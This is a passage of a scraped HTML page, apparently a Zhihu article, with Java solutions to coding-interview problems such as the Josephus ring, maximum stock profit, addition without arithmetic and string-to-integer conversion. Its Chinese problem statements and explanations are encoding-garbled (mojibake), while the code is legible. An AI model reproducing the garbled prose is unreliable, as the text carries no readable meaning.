target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>äº”å¼ ç‰Œï¼Œå…¶ä¸­å¤§å°é¬¼ä¸ºç™å­ï¼Œç‰Œé¢ä¸º 0ã€‚åˆ¤æ–­è¿™äº”å¼ ç‰Œæ˜¯å¦èƒ½ç»„æˆé¡ºå­ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-daa3590e7a189dfc557eef8d2c30441e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"439\" data-rawheight=\"208\" class=\"origin_image zh-lightbox-thumb\" width=\"439\" data-original=\"https://pic3.zhimg.com/v2-daa3590e7a189dfc557eef8d2c30441e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;439&#39; height=&#39;208&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"439\" data-rawheight=\"208\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"439\" data-original=\"https://pic3.zhimg.com/v2-daa3590e7a189dfc557eef8d2c30441e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-daa3590e7a189dfc557eef8d2c30441e_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">isContinuous</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">&lt;</span> <span class=\"n\">5</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n\n    <span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">sort</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">);</span>\n\n    <span class=\"c1\">// ç»Ÿè®¡ç™å­æ•°é‡\n</span><span class=\"c1\"></span>    <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">num</span> <span class=\"o\">:</span> <span class=\"n\">nums</span><span class=\"o\">)</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">num</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n            <span class=\"n\">cnt</span><span class=\"o\">++;</span>\n\n    <span class=\"c1\">// ä½¿ç”¨ç™å­å»è¡¥å…¨ä¸è¿ç»­çš„é¡ºå­\n</span><span class=\"c1\"></span>    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">cnt</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">])</span>\n            <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n        <span class=\"n\">cnt</span> <span class=\"o\">-=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">-</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">cnt</span> <span class=\"o\">&gt;=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>62. åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•°</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/f78a359491e64a50bce2d89cff857eb6%3FtpId%3D13%26tqId%3D11199%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è®©å°æœ‹å‹ä»¬å›´æˆä¸€ä¸ªå¤§åœˆã€‚ç„¶åï¼ŒéšæœºæŒ‡å®šä¸€ä¸ªæ•° mï¼Œè®©ç¼–å·ä¸º 0 çš„å°æœ‹å‹å¼€å§‹æŠ¥æ•°ã€‚æ¯æ¬¡å–Šåˆ° m-1 çš„é‚£ä¸ªå°æœ‹å‹è¦å‡ºåˆ—å”±é¦–æ­Œï¼Œç„¶åå¯ä»¥åœ¨ç¤¼å“ç®±ä¸­ä»»æ„çš„æŒ‘é€‰ç¤¼ç‰©ï¼Œå¹¶ä¸”ä¸å†å›åˆ°åœˆä¸­ï¼Œä»ä»–çš„ä¸‹ä¸€ä¸ªå°æœ‹å‹å¼€å§‹ï¼Œç»§ç»­ 0...m-1 æŠ¥æ•° .... è¿™æ ·ä¸‹å» .... ç›´åˆ°å‰©ä¸‹æœ€åä¸€ä¸ªå°æœ‹å‹ï¼Œå¯ä»¥ä¸ç”¨è¡¨æ¼”ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>çº¦ç‘Ÿå¤«ç¯ï¼Œåœ†åœˆé•¿åº¦ä¸º n çš„è§£å¯ä»¥çœ‹æˆé•¿åº¦ä¸º n-1 çš„è§£å†åŠ ä¸ŠæŠ¥æ•°çš„é•¿åº¦ mã€‚å› ä¸ºæ˜¯åœ†åœˆï¼Œæ‰€ä»¥æœ€åéœ€è¦å¯¹ n å–ä½™ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">LastRemaining_Solution</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">m</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>     <span class=\"cm\">/* ç‰¹æ®Šè¾“å…¥çš„å¤„ç† */</span>\n        <span class=\"k\">return</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">==</span> <span class=\"n\">1</span><span class=\"o\">)</span>     <span class=\"cm\">/* é€’å½’è¿”å›æ¡ä»¶ */</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"n\">LastRemaining_Solution</span><span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">m</span><span class=\"o\">)</span> <span class=\"o\">+</span> <span class=\"n\">m</span><span class=\"o\">)</span> <span class=\"o\">%</span> <span class=\"n\">n</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>63. è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//leetcode.com/problems/best-time-to-buy-and-sell-stock/description/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Leetcode</a></p><h2>é¢˜ç›®æè¿°</h2><p>å¯ä»¥æœ‰ä¸€æ¬¡ä¹°å…¥å’Œä¸€æ¬¡å–å‡ºï¼Œä¹°å…¥å¿…é¡»åœ¨å‰ã€‚æ±‚æœ€å¤§æ”¶ç›Šã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-b2970e333ceb91a6098267200351e3c6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"314\" data-rawheight=\"259\" class=\"content_image\" width=\"314\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;314&#39; height=&#39;259&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"314\" data-rawheight=\"259\" class=\"content_image lazy\" width=\"314\" data-actualsrc=\"https://pic3.zhimg.com/v2-b2970e333ceb91a6098267200351e3c6_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>ä½¿ç”¨è´ªå¿ƒç­–ç•¥ï¼Œå‡è®¾ç¬¬ i è½®è¿›è¡Œå–å‡ºæ“ä½œï¼Œä¹°å…¥æ“ä½œä»·æ ¼åº”è¯¥åœ¨ i ä¹‹å‰å¹¶ä¸”ä»·æ ¼æœ€ä½ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">maxProfit</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">prices</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">prices</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">prices</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">soFarMin</span> <span class=\"o\">=</span> <span class=\"n\">prices</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">];</span>\n    <span class=\"kt\">int</span> <span class=\"n\">maxProfit</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">prices</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">soFarMin</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">min</span><span class=\"o\">(</span><span class=\"n\">soFarMin</span><span class=\"o\">,</span> <span class=\"n\">prices</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]);</span>\n        <span class=\"n\">maxProfit</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">maxProfit</span><span class=\"o\">,</span> <span class=\"n\">prices</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">-</span> <span class=\"n\">soFarMin</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">maxProfit</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>64. æ±‚ 1+2+3+...+n</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/7a0da8fc483247ff8800059e12d7caf1%3FtpId%3D13%26tqId%3D11200%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¦æ±‚ä¸èƒ½ä½¿ç”¨ä¹˜é™¤æ³•ã€forã€whileã€ifã€elseã€switchã€case ç­‰å…³é”®å­—åŠæ¡ä»¶åˆ¤æ–­è¯­å¥ A ? B : Cã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>ä½¿ç”¨é€’å½’è§£æ³•æœ€é‡è¦çš„æ˜¯æŒ‡å®šè¿”å›æ¡ä»¶ï¼Œä½†æ˜¯æœ¬é¢˜æ— æ³•ç›´æ¥ä½¿ç”¨ if è¯­å¥æ¥æŒ‡å®šè¿”å›æ¡ä»¶ã€‚</p><p>æ¡ä»¶ä¸ &amp;&amp; å…·æœ‰çŸ­è·¯åŸåˆ™ï¼Œå³åœ¨ç¬¬ä¸€ä¸ªæ¡ä»¶è¯­å¥ä¸º false çš„æƒ…å†µä¸‹ä¸ä¼šå»æ‰§è¡Œç¬¬äºŒä¸ªæ¡ä»¶è¯­å¥ã€‚åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œå°†é€’å½’çš„è¿”å›æ¡ä»¶å–éç„¶åä½œä¸º &amp;&amp; çš„ç¬¬ä¸€ä¸ªæ¡ä»¶è¯­å¥ï¼Œé€’å½’çš„ä¸»ä½“è½¬æ¢ä¸ºç¬¬äºŒä¸ªæ¡ä»¶è¯­å¥ï¼Œé‚£ä¹ˆå½“é€’å½’çš„è¿”å›æ¡ä»¶ä¸º true çš„æƒ…å†µä¸‹å°±ä¸ä¼šæ‰§è¡Œé€’å½’çš„ä¸»ä½“éƒ¨åˆ†ï¼Œé€’å½’è¿”å›ã€‚</p><p>æœ¬é¢˜çš„é€’å½’è¿”å›æ¡ä»¶ä¸º n &lt;= 0ï¼Œå–éåå°±æ˜¯ n &gt; 0ï¼›é€’å½’çš„ä¸»ä½“éƒ¨åˆ†ä¸º sum += Sum_Solution(n - 1)ï¼Œè½¬æ¢ä¸ºæ¡ä»¶è¯­å¥åå°±æ˜¯ (sum += Sum_Solution(n - 1)) &gt; 0ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">Sum_Solution</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">sum</span> <span class=\"o\">=</span> <span class=\"n\">n</span><span class=\"o\">;</span>\n    <span class=\"kt\">boolean</span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">((</span><span class=\"n\">sum</span> <span class=\"o\">+=</span> <span class=\"n\">Sum_Solution</span><span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">))</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">sum</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>65. ä¸ç”¨åŠ å‡ä¹˜é™¤åšåŠ æ³•</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/59ac416b4b944300b617d4f7f111b215%3FtpId%3D13%26tqId%3D11201%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>å†™ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚ä¸¤ä¸ªæ•´æ•°ä¹‹å’Œï¼Œè¦æ±‚ä¸å¾—ä½¿ç”¨ +ã€-ã€*ã€/ å››åˆ™è¿ç®—ç¬¦å·ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>a ^ b è¡¨ç¤ºæ²¡æœ‰è€ƒè™‘è¿›ä½çš„æƒ…å†µä¸‹ä¸¤æ•°çš„å’Œï¼Œ(a &amp; b) &lt;&lt; 1 å°±æ˜¯è¿›ä½ã€‚</p><p>é€’å½’ä¼šç»ˆæ­¢çš„åŸå› æ˜¯ (a &amp; b) &lt;&lt; 1 æœ€å³è¾¹ä¼šå¤šä¸€ä¸ª 0ï¼Œé‚£ä¹ˆç»§ç»­é€’å½’ï¼Œè¿›ä½æœ€å³è¾¹çš„ 0 ä¼šæ…¢æ…¢å¢å¤šï¼Œæœ€åè¿›ä½ä¼šå˜ä¸º 0ï¼Œé€’å½’ç»ˆæ­¢ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">Add</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">a</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">b</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">b</span> <span class=\"o\">==</span> <span class=\"n\">0</span> <span class=\"o\">?</span> <span class=\"n\">a</span> <span class=\"o\">:</span> <span class=\"n\">Add</span><span class=\"o\">(</span><span class=\"n\">a</span> <span class=\"o\">^</span> <span class=\"n\">b</span><span class=\"o\">,</span> <span class=\"o\">(</span><span class=\"n\">a</span> <span class=\"o\">&amp;</span> <span class=\"n\">b</span><span class=\"o\">)</span> <span class=\"o\">&lt;&lt;</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>66. æ„å»ºä¹˜ç§¯æ•°ç»„</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/94a4d381a68b47b7a8bed86f2975db46%3FtpId%3D13%26tqId%3D11204%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„ A[0, 1,..., n-1]ï¼Œè¯·æ„å»ºä¸€ä¸ªæ•°ç»„ B[0, 1,..., n-1]ï¼Œå…¶ä¸­ B ä¸­çš„å…ƒç´  B[i]=A[0]*A[1]*...*A[i-1]*A[i+1]*...*A[n-1]ã€‚è¦æ±‚ä¸èƒ½ä½¿ç”¨é™¤æ³•ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-058cd373a0cc9fa92bfb46a73d5a1120_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"323\" data-rawheight=\"281\" class=\"content_image\" width=\"323\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;323&#39; height=&#39;281&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"323\" data-rawheight=\"281\" class=\"content_image lazy\" width=\"323\" data-actualsrc=\"https://pic1.zhimg.com/v2-058cd373a0cc9fa92bfb46a73d5a1120_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"nf\">multiply</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">A</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">A</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">B</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">n</span><span class=\"o\">];</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">product</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">product</span> <span class=\"o\">*=</span> <span class=\"n\">A</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">],</span> <span class=\"n\">i</span><span class=\"o\">++)</span>       <span class=\"cm\">/* ä»å·¦å¾€å³ç´¯ä¹˜ */</span>\n        <span class=\"n\">B</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">product</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">n</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">product</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&gt;=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">product</span> <span class=\"o\">*=</span> <span class=\"n\">A</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">],</span> <span class=\"n\">i</span><span class=\"o\">--)</span>  <span class=\"cm\">/* ä»å³å¾€å·¦ç´¯ä¹˜ */</span>\n        <span class=\"n\">B</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">*=</span> <span class=\"n\">product</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">B</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>67. æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/1277c681251b4372bdef344468e4f26e%3FtpId%3D13%26tqId%3D11202%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>å°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢æˆä¸€ä¸ªæ•´æ•°ï¼Œå­—ç¬¦ä¸²ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„æ•°å€¼åˆ™è¿”å› 0ï¼Œè¦æ±‚ä¸èƒ½ä½¿ç”¨å­—ç¬¦ä¸²è½¬æ¢æ•´æ•°çš„åº“å‡½æ•°ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Iuput:\n+2147483647\n1a33\n\nOutput:\n2147483647\n0</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">StrToInt</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">str</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">boolean</span> <span class=\"n\">isNegative</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">==</span> <span class=\"sc\">&#39;-&#39;</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">();</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">char</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">==</span> <span class=\"n\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">(</span><span class=\"n\">c</span> <span class=\"o\">==</span> <span class=\"sc\">&#39;+&#39;</span> <span class=\"o\">||</span> <span class=\"n\">c</span> <span class=\"o\">==</span> <span class=\"sc\">&#39;-&#39;</span><span class=\"o\">))</span>  <span class=\"cm\">/* ç¬¦å·åˆ¤å®š */</span>\n            <span class=\"k\">continue</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">c</span> <span class=\"o\">&lt;</span> <span class=\"sc\">&#39;0&#39;</span> <span class=\"o\">||</span> <span class=\"n\">c</span> <span class=\"o\">&gt;</span> <span class=\"sc\">&#39;9&#39;</span><span class=\"o\">)</span>                <span class=\"cm\">/* éæ³•è¾“å…¥ */</span>\n            <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n        <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"n\">ret</span> <span class=\"o\">*</span> <span class=\"n\">10</span> <span class=\"o\">+</span> <span class=\"o\">(</span><span class=\"n\">c</span> <span class=\"o\">-</span> <span class=\"sc\">&#39;0&#39;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">isNegative</span> <span class=\"o\">?</span> <span class=\"o\">-</span><span class=\"n\">ret</span> <span class=\"o\">:</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>68. æ ‘ä¸­ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€ä½å…¬å…±ç¥–å…ˆ</h2><h2>è§£é¢˜æ€è·¯</h2><h3>äºŒå‰æŸ¥æ‰¾æ ‘</h3><p><a href=\"https://link.zhihu.com/?target=https%3A//leetcode.com/problems/lowest-common-ancestor-of-a-binary-search-tree/description/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Leetcode : 235. Lowest Common Ancestor of a Binary Search Tree</a></p><p>äºŒå‰æŸ¥æ‰¾æ ‘ä¸­ï¼Œä¸¤ä¸ªèŠ‚ç‚¹ p, q çš„å…¬å…±ç¥–å…ˆ root æ»¡è¶³ root.val &gt;= p.val &amp;&amp; root.val &lt;= q.valã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-bd6a013613ac0e745043785b2132f18c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"369\" class=\"origin_image zh-lightbox-thumb\" width=\"424\" data-original=\"https://pic1.zhimg.com/v2-bd6a013613ac0e745043785b2132f18c_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;424&#39; height=&#39;369&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"369\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"424\" data-original=\"https://pic1.zhimg.com/v2-bd6a013613ac0e745043785b2132f18c_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-bd6a013613ac0e745043785b2132f18c_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">TreeNode</span> <span class=\"nf\">lowestCommonAncestor</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">,</span> <span class=\"n\">TreeNode</span> <span class=\"n\">p</span><span class=\"o\">,</span> <span class=\"n\">TreeNode</span> <span class=\"n\">q</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">root</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">&gt;</span> <span class=\"n\">p</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">&gt;</span> <span class=\"n\">q</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">)</span>\n        <span 